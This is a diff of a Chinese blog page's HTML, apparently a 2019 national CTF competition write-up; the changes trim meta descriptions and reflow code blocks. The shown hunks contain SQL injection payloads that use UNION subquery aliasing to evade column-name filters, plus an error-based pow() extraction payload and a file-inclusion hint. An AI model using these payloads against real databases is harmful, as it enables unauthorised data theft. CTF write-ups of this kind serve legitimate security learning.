@@ -81,18 +81,18 @@
 
 
 
-<meta name="description" content="国赛WP第一次和队友一块肝，虽然输出不高（划掉，几乎没有输出），不过也是坚持到了最后，记一下比赛过程中的思路和之后的解题步骤。 web1 just soso看源码发现提示 &amp;lt;!--Please test index.php?file=xxx.php --&amp;gt; &amp;lt;!--Please get the source of hint.php--&amp;gt; php封装协议file=php://">
+<meta name="description" content="国赛WP第一次和队友一块肝，虽然输出不高（划掉，几乎没有输出），不过也是坚持到了最后，记一下比赛过程中的思路和之后的解题步骤。">
 <meta name="keywords" content="WP">
 <meta property="og:type" content="article">
 <meta property="og:title" content="国赛做题+补题">
 <meta property="og:url" content="http://yoursite.com/2019/04/28/国赛做题-补题/index.html">
 <meta property="og:site_name" content="木偶&#39;s blog">
-<meta property="og:description" content="国赛WP第一次和队友一块肝，虽然输出不高（划掉，几乎没有输出），不过也是坚持到了最后，记一下比赛过程中的思路和之后的解题步骤。 web1 just soso看源码发现提示 &amp;lt;!--Please test index.php?file=xxx.php --&amp;gt; &amp;lt;!--Please get the source of hint.php--&amp;gt; php封装协议file=php://">
+<meta property="og:description" content="国赛WP第一次和队友一块肝，虽然输出不高（划掉，几乎没有输出），不过也是坚持到了最后，记一下比赛过程中的思路和之后的解题步骤。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-05-04T11:07:59.032Z">
+<meta property="og:updated_time" content="2019-05-04T11:12:40.405Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="国赛做题+补题">
-<meta name="twitter:description" content="国赛WP第一次和队友一块肝，虽然输出不高（划掉，几乎没有输出），不过也是坚持到了最后，记一下比赛过程中的思路和之后的解题步骤。 web1 just soso看源码发现提示 &amp;lt;!--Please test index.php?file=xxx.php --&amp;gt; &amp;lt;!--Please get the source of hint.php--&amp;gt; php封装协议file=php://">
+<meta name="twitter:description" content="国赛WP第一次和队友一块肝，虽然输出不高（划掉，几乎没有输出），不过也是坚持到了最后，记一下比赛过程中的思路和之后的解题步骤。">
 
 
 
@@ -406,7 +406,7 @@
       
 
       
-        <h2 id="国赛WP"><a href="#国赛WP" class="headerlink" title="国赛WP"></a>国赛WP</h2><p>第一次和队友一块肝，虽然输出不高（划掉，几乎没有输出），不过也是坚持到了最后，记一下比赛过程中的思路和之后的解题步骤。</p>
+        <h2 id="国赛WP"><a href="#国赛WP" class="headerlink" title="国赛WP"></a>国赛WP</h2><p>第一次和队友一块肝，虽然输出不高（划掉，几乎没有输出），不过也是坚持到了最后，记一下比赛过程中的思路和之后的解题步骤。<br><a id="more"></a></p>
 <h3 id="web1-just-soso"><a href="#web1-just-soso" class="headerlink" title="web1 just soso"></a>web1 just soso</h3><p>看源码发现提示</p>
 <pre><code>&lt;!--Please test index.php?file=xxx.php --&gt;
 &lt;!--Please get the source of hint.php--&gt;
@@ -562,13 +562,9 @@ for j&lt;20:
    j=j+1
    print(i)
 </code></pre><p>得到数据库名ctf，现在问题是or被ban了，information也不能用了，没法查表名没法查列名，老大说可以子查询绕过，通过构造子查询 给本来被ban（或者爆不出）的字段名换了个”名字”<br>先构造子查询的联合查询语句并指定别名</p>
-<pre><code>1&apos; UNION SELECT 1,2,admin_x,4,5 FROM (SELECT 1 as 
-admin_1,2 as admin_2,3 as admin_3 from admin WHERE 1=2
-UNION SELECT * from admin)x %23
+<pre><code>1&apos; UNION SELECT 1,2,admin_x,4,5 FROM (SELECT 1 as admin_1,2 as admin_2,3 as admin_3 from admin WHERE 1=2 UNION SELECT * from admin)x %23
 </code></pre><p>猜到表名为user，照着老大的博客构造还弄了好久，那个别名需要定义，否则会出错</p>
-<pre><code>a&apos; union select pow(2,1997+ascii(substr((select 
-admin_2 from (select 1 as admin_1 ,2 as admin_2 from
-user where 1=2 union select * from user)x) ,2,1))) #
+<pre><code>a&apos; union select pow(2,1997+ascii(substr((select  admin_2 from (select 1 as admin_1 ,2 as admin_2 from user where 1=2 union select * from user)x) ,2,1))) #
 </code></pre><p>改造上面的脚本爆出密码（队友爆出来的，脚本出了问题，burp手注，太慢了，菜醒）<br>得到密码登陆。</p>
 <p>其他师傅们的思路 select cot(0)报错，select cot(1) 可以执行，之后就是布尔盲注结合子查询。</p>
 <p>###web3 love_math</p>
